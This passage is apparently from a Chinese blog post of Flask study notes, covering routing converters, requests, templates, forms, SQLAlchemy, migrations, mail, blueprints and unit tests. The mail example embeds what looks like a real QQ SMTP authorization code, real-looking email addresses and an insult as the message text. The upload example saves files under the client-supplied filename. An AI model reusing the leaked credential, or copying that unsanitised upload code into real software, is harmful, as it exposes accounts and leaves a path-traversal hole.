int转换器类型，匹配整数\n    float转换器类型，匹配小数\n    path转换器类型，匹配字符串，但是包括/\n        @app.route('/goods/<int:id>')\n        def goods_detail(id):\n                '''定义商品视图函数'''\n            return f'goods detail page{id}'\n\n    自定义转换器(三步):\n        1、定义自己的转换器:\n            导入from werkzeug.routing import BaseConverter。\n            定义一个转换器类，使其继承BaseConverter.\n        2、将自定义的转换器添加到flask的应用中:\n            app.url_map.converters['转换器名'] = 类名\n        3、使用:\n            @app.route('/路径/<转换器类型:参数名>')\n```\n### 定义万能转换器\n```text\n说明一点:转换器也可以跟参数（re）: @app.route('/路径/<转换器类型(参数):参数名>')\n方式一、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map, regex):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = regex\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/<re(r'1[34578]\\d{9}'):id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page{id}'\n方式二、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = r'1[34578]\\d{9}'\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/<re:id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page{id}'\n```\n\n### 高级的转换器应用\n```text\nclass ReConverter(BaseConverter):\n    '''\n        re万能转换器\n        创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n        在视图函数使用的时候，可以跟参数，一个正则\n        工作原理:\n            在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n    '''\n\n    # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n    def __init__(self, url_map):\n        super().__init__(url_map)\n        # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n        # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n        self.regex = r'1[34578]\\d{9}'\n\n    '''\n        to_python和to_url都是父类中的方法:\n            to_python:在匹配成功以后，请求网址带来的参数会交给to_python做出处理，返回的结果为视图函数的参数\n            to_url:在使用重定向(url_for)的时候使用，url(\"视图名\",参数)\n            使用重定向的时候，被定向的视图函数如果有参数需要匹配，那么，在重定向的时候，在使用url_for()的时候，就会去匹配一次被定向视图使用的转换器，在匹配成功的同时调用to_url方法\n            在to_url中处理以后，会交给to_python处理\n\n    '''\n\n    def to_python(self, value):\n        return value\n\n    def to_url(self, value):\n        return '13443218888'\n\n\n# 加到应用中\napp.url_map.converters['re'] = ReConverter\n\n\n@app.route(\"/goods/<re:id>\")\ndef goods_detail(id):\n    '''定义商品视图函数'''\n    return f'goods detail page{id}'\n\n\n@app.route(\"/index\")\ndef index():\n    url = url_for(\"goods_detail\", id=13412344321)\n    return redirect(url)\n```\n\n## Request对象\n```text\n从flask中导入request和Response\nrequest中常用的属性:\n    data:获取请求的数据，并转换为字符串，request.data\n    form:获取请求中的表单数据,request.form.get()，获取一对一,request.form.getlist()，获取一对多的数据\n    args:获取url中的参数(http:x.x.x.x:xxx/xxx?city=chengdu)，\n    cookies:获取到cookie，request.cookies.get()\n    headers:获取请求头中的报文:request.headers\n    method:获取请求方式:request.method\n    url:获取请求的url:request.url\n    files:获取上传的文件:  if request.method == 'POST':\n                            file = request.files.get('pic')\n                            file.save(f'./img/{file.filename}')\n    path: 拿到浏览器请求的地址（视图）\n```\n\n### abort\n```\n从flask中导入abort\n无条件终止视图函数的执行，并返回给前端特定的信息\n用法一、\n    abort（状态码）\n用法二、\n    re = Response(\"login defete\")\n    abort(re)\n```\n### 自定义错误信息\n```\n用户访问的页面不错在的时候，定义一个独立的视图,用@app.errorheader(404)来装饰\n固定写法:\n    @app.errorhandler(404)\n    def header_error(err):\n         return '没有'\n```\n### 设置响应信息的方法\n```\n从flask中导入make_response\n方法一:\n    使用:\n    rsp = make_response(显示的字符串)\n    rsp.status = '999 lqs'  状态码\n    rsp.headers['lqs'] = 'lqs'   头信息\n    return rsp\n方法二:\n    return 显示字符串, 状态码, 头信息\n ```\n#### json\n```\n方法一、import json\n    dic = {\"name\": \"lqs\", \"age\": 12}\n    json_str = json.dumps(dic)\n    print(type(json_str))\n    print(json_str)\n    dic_str = json.loads(json_str)\n    print(type(dic_str))\n    print(dic_str)\njson.dumps():字典转json字符串\njson.loads():json字符串转字典\n\n方法二、从flask中导入jsonify\n    return jsonify(dic) ：将字典转成json字符串，并且自动设置头信息\n```\n### cookie的读写\n```\n读写和django一样，都是通过response写入，通过request读取\n在有关cookie的操作中，都要 app.config[\"SECRET_KEY\"] = xxxxxx\n    导入:from flask import make_response\n    实例化:resp = make_response(显示字符串)\n    设置:resp.set_cookie(\"lqs\", \"Flask\", max_age=3600)\n    读取:request.cookies.get('lqs')\n    删除:resp.delete_cookie('lqs')\n```\n\n### session的读写\n```\n导入: from flask import session\n设置: session[key] = value\n读取: session.get(key)\n```\n\n### 钩子\n```\n类似于django中的中间件\n在请求的时候使用，不是任何请求都会调用，是调用到视图函数的时候，在之前或者之后进行操作\n@app.before_first_request : 第一次请求之前调用\n@app.before_request : 每次请求之前调用\n@app.after_request : 每次请求之后调用（视图函数没有出错的情况）\n@app.teardown_request : 每次请求之后调用（不论是否出错都会调用）\n\n@app.after_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西\n@app.teardown_request : 对应的视图函数必须带一个参数，用来接收视图函数的返回值，也就是接收在页面上现实的东西\n```\n### g对象\n```\nfrom flask import g\ng对象中保存的数据，在一次请求中的，多个函数中可以使用\n使用:\n    g.key = value:存\n    xx = g.key:取\n```\n### flask_script扩展(实现shell代码),这样子可以和django一样，runserver\n```\npip install Flask-Script\nfrom flask_script import Manager\nmanager = Manager(flask应用名)\nmanager.run()\n```\n### flask使用模板文件\n```\nfrom flask import render_template\nreturn render_template(\"html模板\", key=value, key=value)  或者    return render_template(\"html模板\", **字典名（组织之后的上下文）)\n在html模板文件中，可以使用过滤器:使用方法:{{value | 过滤器}}如safe就表示转义\n```\n### flask中html模板转义\n```\n使用方法: {{ 处理对象 | 过滤器 }}\n常用过滤器:\n    safe : 禁用转义\n    capitalize : 变量值的首字母转换成大写其余小写\n    lower : 全部转换为小写\n    upper : 全部转换为大写\n    title : 每个单词首字母大写\n    trim  : 去除首尾空格\n    reverse : 字符串反转\n    format : 格式化输出\n    striptags : 渲染之前把所有的html标签去掉\n    first : 取出列表中的第一个元素\n    last : 取出列表中的最后一个元素\n    length : 获取列表的长度\n    sum : 列表数据求和\n    sort : 列表排序\n自定义过滤器:\n    在flask代码中定义\n    第一种方式(函数):\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        app.add_template_filter(函数名, 过滤器名)就可以注册这个过滤器\n        然后在html模板中使用\n    第二种方式(装饰器:\n        定义一个过滤器函数\n        返回值就是过滤后的数据\n        加装饰器:@app.template_filter(过滤器名)\n        然后在html模板中使用\n\n```\n### flask使用Flask-WTF\n```\n可以在服务器端(创建表单模型)校验表单数据，可以设置csrf攻击的关闭\npip install Flask-WTF\nfrom flask_wtf import FlaskForm : 这个模块让类继承之后就可以实现创建表单模型\nfrom wtforms import StringField, PasswordField, SubmitField : 这个wtforms模块中的方法都是关于表单中的各个控件的类型，这里没有写全面\nfrom wtforms.validators import DataRequired, EqualTo : wtforms下面的validators模块中的方法就是一些校验规则\n\n说明: 在flask中定义的表单模型作用有两个,首先，第一个作用就是不用用户再去自己打表单，可以将表单模型传到模板中生成表单，第二个作用就是验证数据，两个作用是区分开的\n\n定义表单模型类:\n    class LoginForm(FlaskForm):\n    '''\n        自定义的注册表单抽象类\n            label标签表示设置名称,用中文就使用u\"xx\"\n            validators表示验证数据，是一个列表类型\n            DataRequired表示必须输入，有一个参数，表示验证失败的时候显示文本\n            EqualTo表示和谁一样，有连个参数，第一个填写和谁一样，第二个填写验证失败的显示文本\n    '''\n        user_name = StringField(label=u\"用户名\", validators=[DataRequired(\"用户名不能为空\")])\n        password = PasswordField(label=r\"密码\", validators=[DataRequired(\"密码不能为空\")])\n        password2 = PasswordField(label=r\"确认密码\", validators=[DataRequired(\"确认密码不能为空\"), EqualTo(\"password\", \"两次密码不一致\")])\n        submit = SubmitField(label=u\"提交\")\n\n\n        @app.route(\"/login\", methods=[\"POST\", \"GET\"])\n        def login():\n            '''创建表单对象'''\n            form = LoginForm()\n            # 判断form中的数据是否合理\n            # 如果form中的数据完全满足验证，则返回真，否则返回假\n            if form.validate_on_submit():\n                uname = form.user_name.data\n                pwd = form.password.data\n                pwd2 = form.password2.data\n                print(uname, pwd, pwd2)\n                session[\"username\"] = uname\n                url = url_for(\"index\")\n                return redirect(url)\n            return render_template(\"login.html\", form=form)\n\n\n在html模板中生成表单:\n     <form  method=\"post\">\n        {{ form.csrf_token}}\n        {{ form.user_name.label }} {{ form.user_name }}<br>\n        {% for msg in form.user_name.errors %}\n        <p>{{ msg }}</p>\n        {% endfor %}\n\n        {{ form.password.label }} {{ form.password }}<br>\n        {% for msg in form.password.errors %}\n        <p>{{ msg }}</p>\n        {% endfor %}\n\n        {{ form.password2.label }} {{ form.password2 }}<br>\n        {% for msg in form.password2.errors %}\n        <p>{{ msg }}</p>\n        {% endfor %}\n\n        <p>{{ form.submit }}</p>\n\n     </form>\n\n```\n### 宏的定义和使用\n```\n在同一个html中定义和使用:\n    没有参数:\n        定义:\n        {% macro input() %}\n         <input type=\"text\" name=\"\" value=\"\" size=\"30\">\n        {% endmacro %}\n        使用:\n        {{ input() }}\n    有参数:\n    定义:\n    {% macro input(type,name,size) %}\n     <input type={{type}} name={{name}} value=\"\" size={{size}}>\n    {% endmacro %}\n    使用:\n    {{ input('text', 'username', 40) }}\n\n在不同html中定义和使用:\n    没有参数:\n        定义在macro2.html中:\n        {% macro input() %}\n         <input type=\"text\" name=\"\" value=\"\" size=\"30\">\n        {% endmacro %}\n        在macro。html使用:\n        {% import \"macro2.html\" as 别名 %}\n        {{ 别名.input() }}\n\n```\n### 模板继承\n```\n和django中的模板继承一样: {% extend \"模板名\" %}  使用 {% block xx %} {% endblock xx %}\n```\n\n### flask中一些特殊的方法\n```\n有些方法和变量不需要传递也可以在模板中直接使用\nconfig中的方法\nrequest中的方法\nurl_for中的方法\n模板的闪现:\n    闪现就是表示有的信息，只是出现一次\n    在flask中:from flask import flash\n            在视图中使用flash(xxx)来添加信息，可以添加很多条\n    在模板中:\n        {% for x in get_flashed_messages() %}\n        {{ x }}\n        {% endfor %}\n```\n### flask链接数据库\n```\npip install flask-sqlalchemy  模型类到sql语句的转换，再将结果转换为模型类对象\npip install flask-mysqldb   数据库驱动\nfrom flask_sqlalchemy import SQLAlchemy  可以创建数据库对象\n配置:\n    app.config['SQLALCHEMY_DATABASE_URI'] = \"mysql://root:123456@127.0.0.1:3306/msfood\"\n    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True   # 配置跟踪,数据库和模型类同步\n创建数据库sqlalchemy工具对象,就可以使用数据库了\n    db = SQLAlchemy(app)\n\n\n创建模型类\nclass Role(db.Model):\n    '''身份表'''\n    __tablename__ = \"tbl_roles\"  # 指明表名\n    id = db.Column(db.Integer, primary_key=True)\n    name = db.Column(db.String(32), unique=True)\n    users = db.relationship(\"User\", backref=\"role\")\n     def __repr__(self):\n        '''补充方法,可以让显示对象的时候更直观,类似于__str__方法'''\n        return f'{self.users}'\nclass User(db.Model):\n    '''用户表'''\n    __tablename__ = \"tbl_users\"  # 指明数据库的表名\n    id = db.Column(db.Integer, primary_key=True)  # 主键，自动递增\n    name = db.Column(db.String(64), unique=True)\n    email = db.Column(db.String(128), unique=True)\n    password = db.Column(db.String(128))\n    role_id = db.Column(db.Integer, db.ForeignKey(\"tbl_roles.id\"))\n\n生成数据表:\n    *第一次生成的时候清除所有数据:\n         db.drop_all()\n    创建所有表\n        db.create_all()\n\n说明:\n    创建表的时候，和底层相关，只要是表中的一行，都是有关底层的，用的都是真实的表的名字\n    users = db.relationship(\"User\", backref=\"role\"): 这个语句就是表示和底层无关，只和flask中的对象有关，User就是一个模型对象\n        users表和roles表是有关联的（外键）,那么db.relationship就可以让两个表相互拿东西，表示从User模型类中拿出和Role模型有关联的数据\n        backref表示没有定义relationship的对方表中，也可以反推拿出和User模型有关的Role模型的数据\n        使用方法:\n            在Role模型:role.users\n            在user模型中:user.role\n\n添加数据:\n    创建对象:xx = 模型(属性=值，属性=值)\n    session记录对象任务:db.session.add(xx),添加一条数据，db.session.add_all(),添加多条数据\n    提交任务到数据库:db.session.commit()\n```\n### sqlalchemy查询\n```\n用模型类来查询\n模型类.query.all():查询所有数据，返回的是一个列表，可以取出某一个对象，然后读取属性值\n模型类.query.first():返回第一条记录\n模型类.query.get(主键的id):根据主键id获取对象\n模型类.query.filter_by(字段=xx,字段==xx).all():获取满足条件的所有数据,条件是与\n模型类.query.filter(模型类.字段==xx,模型类.字段==xx).all():拿出满足条件的所有数据，条件是与\n模型类.query.filter(or_(模型类.字段==xx,模型类.字段.endswith(xxx))).all():拿出满足条件的所有数据，条件是或，使用或必须导入from sqlalchemy import or_\n模型类.query.filter(条件).offset(2).limit(3).order_by(模型类.字段.desc()).all():返回满足条件并且忽略前两条数据，取出三条数据然后降序排列的数据，每一个部分都可以单独使用\ndb.session.query(模型类.字段, func.count(模型类.字段)).group_by(模型类.字段).all():分组查询，from sqlalchemy import func,func.聚合函数(属性),就可以查出来\n```\n\n#### sqlalchemy修改\n```\n模型类.query.filter(条件).update({字段名:值,字段名:值,字段名:值})\ndb.session.commit()\n```\n#### sqlalchemy删除\n```\n xx = 模型类.query.get(x)\n db.session.delete(xx)\n db.session.commit()\n```\n\n#### flask中和django一样使用迁移的方式\n```\npip install flask-migrate\nfrom flask_script import Manager\nfrom flask_migrate import Migrate, MigrateCommand\n\ndb = SQLAlchemy(app)\n\n创建flask脚本管理工具\nmanager = Manager(app)\n创建数据库迁移工具对象\nMigrate(app, db)\n向manager对象中添加数据的操作命令\nmanager.add_command(\"操作的名字\", MigrateCommand)\n\nmain中:\n    manager.run()\n终端中:\n    python3 xxx.py 操作的名字 init  : 让他初始化一下，自动创文件夹\n    python3 xxx.py 操作的名字 migrate -m \"版本说明信息\" : 生成迁移文件（版本说明可以不要），同价与django中的makemigrations\n    多次migrate之后需要更新数据库:python3 xxx.py 操作的名字 upgrade，可以升级同步\n    python3 xxx.py 操作的名字 history : 查看历史修改\n    python3 xxx.py 操作的名字 downgrade 版本编号 : 版本回退\n\n```\n\n### flask发送邮件\n```\npip install flask-mail\nfrom flask_mail import Mail, Message\napp = Flask(__name__)\n\napp.config.update(\n    DEBUG=True,\n    MAIL_SERVER='smtp.qq.com',\n    MAIL_PROT=465,\n    MAIL_USE_TLS=True,\n    MAIL_USERNAME='749062870@qq.com',\n    MAIL_PASSWORD='kttumcufpqasbcii',\n)\n\n # sender发送方,recipients接收方列表\n    mail = Mail() : 创建mail对象\n    mail.init_app(app) : 初始化mail对象\n    msg = Message(\"傻逼\", sender=\"749062870@qq.com\", recipients=[\"2807175480@qq.com\"]) : 设置邮件消息的邮件头\n    msg.body = \"傻逼\"  : 设置邮件的正文\n    mail.send(msg) : 发送邮件\n```\n### 蓝图（Blueprint）\n```\n之前写的都在一个py文件中\n蓝图就是分割各个块\n将视图写在其他的py文件中，那么不用再给写在外面的视图加装饰器，可以在有app的py文件中导入，然后通过app.route(\"路径\")(视图函数)\n\n蓝图的正解:\n    '''\n        蓝图和django中的各个应用差不多,一个蓝图自成一块，在主窗口中注册进app里面就可以使用\n        使用方法:\n            创建一个应用目录，再添加一个__init__.py让这个目录成为一个可以调动的包，再__init__.py中定义好蓝图,再到视图中导入这个蓝图，就可以使用，最后再视图使用之后，再到__init__.py中\n            导入视图中使用了蓝图的视图函数。\n            蓝图再使用模板文件和静态文件的时候，和主app不同，主app有默认的配置，而蓝图中没有，需要再定义蓝图的时候手动设置，和主app的设置方法是一样的\n            蓝图在没有定义静态文件目录和模板文件目录的时候，默认是使用主app的，就算配置可静态目录和模板目录，蓝图也是先去主app的静态目录和模板目录查找，没有找到在回到自己的里面去找，这个时候，就是主app的优先级大于蓝图\n            在视图中使用蓝图:\n                1、在__init__.py中from flask import Blueprint\n                2、在__init__.py中定义蓝图,xx = Blueprint(\"蓝图名\",__name__)\n                3、导入蓝图\n                4、用蓝图装饰，和主app装饰视图一摸一样的\n                5、在__init__.py中导入使用了蓝图的视图函数（导入到蓝图之下）\n                6、在主app的文件中注册蓝图:app.register_blueprint(蓝图, url_prefix=\"/lqs\")，url_prefix表示前缀\n    '''\n```\n### 单元测试\n```\n在flask中使用单元测试的时候，千万不要动源代码，重新写个测试文件\nimport unittest\n导入要测试的flask代码文件\n创建测试类，继承unittest.TestCase\n定义好测试函数\nimport unittest\nimport json\nfrom flaskDay14 import Test\n\nclass Index(unittest.TestCase):\n    def setUp(self):\n        # 设置flask工作在测试模式下，在测试出错的时候会给出具体错误行\n        Test.app.testing = True\n        # 模拟flask客户端,setUp中的代码会在所有函数之前调用\n        self.client = Test.app.test_client()\n    def test_index(self):\n        # 模拟请求返回数据\n        ret = self.client.post(\"/index\", data={\"username\":\"lqs\", \"password\":\"lqs\"})\n        # 拿到数据\n        resp = ret.data\n        # 装成字典\n        resp = json.loads(resp)\n        # 断言\n        self.assertIn(\"code\", resp)\n        self.assertEqual(resp[\"code\"], 2)\n\n\nif __name__ == '__main__':\n    # 测试\n    unittest.main()\n\n对所有的测试都可以使用\n```","slug":"Flask基础","published":1,"updated":"2023-03-10T02:55:46.686Z","_id":"cld2uqf6000011svk6hw34k0k","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Flask\"><a href=\"#Flask\" class=\"headerlink\" title=\"Flask\"></a>Flask</h1><h2 id=\"name-对象说明\"><a href=\"#name-对象说明\" class=\"headerlink\" title=\"__name__对象说明\"></a><code>__name__</code>对象说明</h2><p><code>__name__</code>返回的就是当前的模块名字</p>\n<p><code>__name__</code>如果在本文件中使用的话，那么就是<code>__main__</code></p>\n<p><code>__name__</code>如果本文件被导入到别的文件中使用的话，那么就是模块的名字<br>在文件中，被调用的时候，永远不可能等于<code>__main__</code></p>\n<h2 id=\"Flask-1\"><a href=\"#Flask-1\" class=\"headerlink\" title=\"Flask\"></a>Flask</h2><p>创建Flask对象: 名字 = Flask(一个魔法值(以这个为根目录)),括号里面的参数，就表示以这个参数所在的模块为根目录，默认这个目录中的static为静态目录，templates为模板目录</p>\n<p>创建视图: 等于创建一个函数，要显示给浏览器的数据，直接return</p>\n<p>路径配置: 给视图函数加装饰器,格式: app.route(‘路径’)</p>\n<p>运行flask: app.run(),flask的参数:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 创建flask的应用对象，__name__返回的就是当前的模块名字,表示以什么为根目录</span>\n   static_url_path<span class=\"token operator\">=</span><span class=\"token string\">'/python'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 访问静态的url前缀，不设置的话默认值是static</span>\n   static_folder<span class=\"token operator\">=</span><span class=\"token string\">'static'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 静态文件的目录，默认就是static</span>\n   template_folder<span class=\"token operator\">=</span><span class=\"token string\">'templates'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 模板文件的目录，默认的是templates</span>\n   <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"flask的配置\"><a href=\"#flask的配置\" class=\"headerlink\" title=\"flask的配置\"></a>flask的配置</h3><blockquote>\n<p>  flask没有Django那种的专门的配置文件，但是可以通过以下的三种方式来配置</p>\n<ul>\n<li>1、使用配置文件:<ul>\n<li>  1、创建一个配置文件xxx.cfg</li>\n<li> 2、app.config.from_pyfile(文件的路径)</li>\n</ul>\n</li>\n<li> 2、使用配置对象:<ul>\n<li>  1、创建一个类，将配置写入</li>\n<li>  2、app.config.from_object(类名)</li>\n</ul>\n</li>\n<li> 3、直接配置    -    app.config[‘DEBUG’] = True<ul>\n<li>  app.config.update(key=v1,k2=v2):一次性配置多个，如果已经存在，那么表示更新</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"获取配置中的参数\"><a href=\"#获取配置中的参数\" class=\"headerlink\" title=\"获取配置中的参数\"></a>获取配置中的参数</h3><blockquote>\n<p>   在flask中，配置中除了可以存储flask的配置，也可以存储开发者放的一些数据</p>\n<ul>\n<li>  获取方式一: app.config.get(‘key’)</li>\n<li>   获取方式二: current_app.config.get(‘key’),这是一个模块，也在flask模块中导入，current_app等价于app,有的时候我们拿不到app，所以这个模块可以替代</li>\n</ul>\n</blockquote>\n<h3 id=\"app-run-的使用\"><a href=\"#app-run-的使用\" class=\"headerlink\" title=\"app.run()的使用\"></a>app.run()的使用</h3><blockquote>\n<p>  app.run(host=’x.x.x.x’, port=xxx, debug=True(False)) ,app.run(host=’0.0.0.0’, port=xxx)是万能的</p>\n</blockquote>\n<h3 id=\"查看路由表\"><a href=\"#查看路由表\" class=\"headerlink\" title=\"查看路由表\"></a>查看路由表</h3><blockquote>\n<p> 和Django相比，Flask没有一个直观的路由表，而Django却有urls.py文件可以查看路由表</p>\n<p>  Flask查看路由表: app.url_map，这个方法就可以查看flask的路由表，默认的有static的路由记录，还可以查看请求方式</p>\n<p> 如果某些视图只能用某些请求方式来访问，那么方法就是:@app.route(‘路径’, methods=[请求方式列表])</p>\n<p>  当有多个视图对应同一个url地址的时候，解决方法是：要么修改url,要么修改请求方式</p>\n<p>  当有多个url地址对应一个视图函数的时候(给视图函数多装几个装饰器)，那么就是说这多个url都可以访问这个视图</p>\n<p>  重定向:从flask中导入redirect模块，就可以实现重定向(跳转，两次请求，重定向状态码302),用法:return redirect(url地址)</p>\n<p>  反向解析: 从flask中导入url_for模块,就可以实现反向解析，用法: url = url_for(‘视图函数的名字’, 参数列表)</p>\n</blockquote>\n<h4 id=\"url带参数\"><a href=\"#url带参数\" class=\"headerlink\" title=\"url带参数\"></a>url带参数</h4><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">@app.route('/路径/&lt;转换器类型:参数名>'):\n    已经实现的转换器类型: int , float , path,如:@app.route('/index/&lt;int:id>'),在访问的时候:127.0.0.1:5000://index/123就可以访问.\n    不加转换器类型就是表示匹配普通的字符串（除了/）:@app.route('/路径/&lt;参数名>')\n    int转换器类型，匹配整数\n    float转换器类型，匹配小数\n    path转换器类型，匹配字符串，但是包括/\n        @app.route('/goods/&lt;int:id>')\n        def goods_detail(id):\n                '''定义商品视图函数'''\n            return f'goods detail page&#123;id&#125;'\n\n    自定义转换器(三步):\n        1、定义自己的转换器:\n            导入from werkzeug.routing import BaseConverter。\n            定义一个转换器类，使其继承BaseConverter.\n        2、将自定义的转换器添加到flask的应用中:\n            app.url_map.converters['转换器名'] = 类名\n        3、使用:\n            @app.route('/路径/&lt;转换器类型:参数名>')<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"定义万能转换器\"><a href=\"#定义万能转换器\" class=\"headerlink\" title=\"定义万能转换器\"></a>定义万能转换器</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">说明一点:转换器也可以跟参数（re）: @app.route('/路径/&lt;转换器类型(参数):参数名>')\n方式一、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map, regex):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = regex\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/&lt;re(r'1[34578]\\d&#123;9&#125;'):id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page&#123;id&#125;'\n方式二、\n    class ReConverter(BaseConverter):\n        '''\n            re万能转换器\n            创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n            在视图函数使用的时候，可以跟参数，一个正则\n            工作原理:\n                在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n        '''\n        # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n        def __init__(self, url_map):\n            super().__init__(url_map)\n            # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n            # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n            self.regex = r'1[34578]\\d&#123;9&#125;'\n    # 加到应用中\n    app.url_map.converters['re'] = ReConverter\n    @app.route(\"/goods/&lt;re:id>\")\n    def goods_detail(id):\n        '''定义商品视图函数'''\n        return f'goods detail page&#123;id&#125;'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"高级的转换器应用\"><a href=\"#高级的转换器应用\" class=\"headerlink\" title=\"高级的转换器应用\"></a>高级的转换器应用</h3><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">class ReConverter(BaseConverter):\n    '''\n        re万能转换器\n        创建好自定义的转换器之后，我们就将这个自定义的转换器，添加到应用中\n        在视图函数使用的时候，可以跟参数，一个正则\n        工作原理:\n            在访问网址的时候，给定参数，在服务器接收到数据时，会根据转换器的正则来判断时候是一个非法的数据\n    '''\n\n    # url_map是一个固定的参数,必须调用父类的初始化方法，也必须传入这个参数\n    def __init__(self, url_map):\n        super().__init__(url_map)\n        # self.regex是BaseConverter中的参数（接收正则）,他是专门来看看你自定义的转换器是什么样的一个转换器，接收参数（re）\n        # 将正则表达式的参数保存到对象的属性中，flask会去使用这个属性来进行正则匹配\n        self.regex = r'1[34578]\\d&#123;9&#125;'\n\n    '''\n        to_python和to_url都是父类中的方法:\n            to_python:在匹配成功以后，请求网址带来的参数会交给to_python做出处理，返回的结果为视图函数的参数\n            to_url:在使用重定向(url_for)的时候使用，url(\"视图名\",参数)\n            使用重定向的时候，被定向的视图函数如果有参数需要匹配，那么，在重定向的时候，在使用url_for()的时候，就会去匹配一次被定向视图使用的转换器，在匹配成功的同时调用to_url方法\n            在to_url中处理以后，会交给to_python处理\n\n    '''\n\n    def to_python(self, value):\n        return value\n\n    def to_url(self, value):\n        return '13443218888'\n\n\n# 加到应用中\napp.url_map.converters['re'] = ReConverter\n\n\n@app.route(\"/goods/&lt;re:id>\")\ndef goods_detail(id):\n    '''定义商品视图函数'''\n    return f'goods detail page&#123;id&#125;'\n\n\n@app.route(\"/index\")\ndef index():\n    url = url_for(\"goods_detail\", id=13412344321)\n    return redirect(url)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Request对象\"><a href=\"#Request对象\" class=\"headerlink\" title=\"Request对象\"></a>Request对象</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">从flask中导入request和Response\nrequest中常用的属性:\n    data:获取请求的数据，并转换为字符串，request.data\n    form:获取请求中的表单数据,request.form.get()，获取一对一,request.form.getlist()，获取一对多的数据\n    args:获取url中的参数(http:x.x.x.x:xxx/xxx?city=chengdu)，\n    